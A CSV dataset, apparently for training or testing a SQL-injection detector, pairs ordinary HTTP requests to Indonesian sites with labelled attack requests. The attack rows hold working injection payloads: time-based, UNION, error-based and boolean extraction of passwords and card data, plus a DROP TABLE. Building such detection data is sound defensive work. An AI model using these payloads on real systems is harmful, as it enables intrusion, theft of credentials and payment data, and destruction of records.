payload,label
GET http://shop.tokobaju.id/products/search?q=kaos+polos&color=white&size=L,benign
"GET http://portal.univ-malang.ac.id/academic/grade?nim=202110001&semester=3&year=2024' AND SLEEP(5)--",attack
POST http://api.logistik-nusantara.com/v2/shipment/track?awb=JNE8812309&origin=MLG,benign
"GET http://cms.beritajatim.net/article/view?id=1 UNION SELECT NULL,username,password FROM cms_users--",attack
GET http://dashboard.solarmonitoring.id/panel?site_id=SL-0042&date=2024-06-01&metric=kwh,benign
"GET http://erp.manufaktur-prima.co.id/inventory/item?code=ITM-991' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--",attack
POST http://mobile.bankjatim.co.id/api/transfer?from_acc=1234567890&to_acc=0987654321&amount=500000,benign
"GET http://helpdesk.telkomsolution.com/ticket?id=882' AND (SELECT CASE WHEN (1=1) THEN SLEEP(3) ELSE 0 END)--",attack
GET http://map.wisatamalang.id/poi?category=waterfall&radius=20km&rating=4,benign
"GET http://admin.mediaportal.id/user/profile?uid=55' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users--",attack
GET http://iot.smartfarm-kediri.id/sensor/data?device=SN-0021&param=soil_ph&from=2024-06-01,benign
"GET http://crm.agencymaju.id/client/detail?cid=301' AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())),1)--",attack
POST http://booking.hotelmelati.com/reservation?room=deluxe&checkin=2024-08-10&checkout=2024-08-13,benign
"GET http://store.elektronikmurah.co.id/product?pid=1002 AND 1=2 UNION SELECT NULL,NULL,@@version--",attack
GET http://tracker.fleetmanager.id/vehicle?plate=N-1234-AB&date=2024-07-01&interval=10m,benign
"GET http://portal.pemkotmalang.go.id/izin/status?doc_id=IMB-2024-0091' AND ASCII(SUBSTRING((SELECT password FROM admin LIMIT 1),1,1))>97--",attack
POST http://api.edukasiku.id/quiz/submit?quiz_id=QZ-441&user_id=U8812&score=85,benign
"GET http://backend.travelindonesia.id/flight/search?route=CGK-SUB&date=2024-07-20' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",attack
GET http://dashboard.powerplant-jawa.id/turbine?unit=T3&shift=morning&date=2024-07-01,benign
"GET http://api.siakad-brawijaya.ac.id/student?nim=195150001' UNION SELECT NULL,NULL,CONCAT(username,0x3a,password) FROM user_accounts--",attack
GET http://pos.restoranpadang.id/order?table=7&cashier=rina&date=2024-06-30,benign
"GET http://backend.marketplacetani.id/product?id=521' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(0x3a,database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x LIMIT 1)--",attack
POST http://report.keuanganku.id/export?user_id=U2291&month=6&year=2024&format=pdf,benign
"GET http://cms.radiosuara.fm/news?article_id=881' AND IF(SUBSTR(database(),1,1)='i',SLEEP(4),0)--",attack
GET http://api.perpustakaan-daerah.id/book?isbn=978-602-0000-00-0&available=true,benign
"GET http://portal.disnakermalang.go.id/lowongan?id=2024-0119';DROP TABLE job_applications--",attack
GET http:/logistics.ekspedisicepat.id/package?awb=SIC99812301&status=delivered,benign
"GET http://api.rumahadat.id/artifact?id=441' AND BENCHMARK(5000000,MD5(CHAR(1)))--",attack
POST http://payment.kopkar-sejahtera.id/loan?member_id=M7721&amount=5000000&tenor=12,benign
"GET http://backend.sistemrs.id/patient?mrn=RM-2024-0091' AND (SELECT 1 WHERE 1=1 AND SLEEP(3))--",attack
GET http://dashboard.esdm-monitoring.id/oil/well?field=cepu&well=CX-12&date=2024-07-01,benign
"GET http://api.ecommerce-batik.id/order?order_id=ORD-9921' UNION SELECT NULL,NULL,CONCAT(card_number,0x3a,cvv) FROM payment_info--",attack
GET http://portal.bpjsketenagakerjaan-sim.id/member?nik=3573041234560001&year=2024,benign
"GET http://admin.situsberita.id/post/edit?id=221' AND UPDATEXML(1,CONCAT(0x7e,(SELECT SUBSTR(password,1,10) FROM admin WHERE username='superadmin')),1)--",attack
POST http://api.smartparking-surabaya.id/slot?zone=C&slot_id=22&duration=180,benign
"GET http://crm.propertiindonesia.id/listing?lid=8812' RLIKE (SELECT CASE WHEN (1=1) THEN SLEEP(3) ELSE 0x28 END)--",attack
